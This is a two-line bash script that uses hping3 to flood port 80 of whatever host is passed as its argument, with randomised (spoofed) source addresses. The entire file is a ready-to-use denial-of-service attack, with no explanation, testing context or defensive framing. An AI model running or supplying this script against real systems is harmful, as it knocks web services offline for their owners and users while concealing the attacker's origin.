#!/bin/bash
hping3 --flood --rand-source -p 80 $1
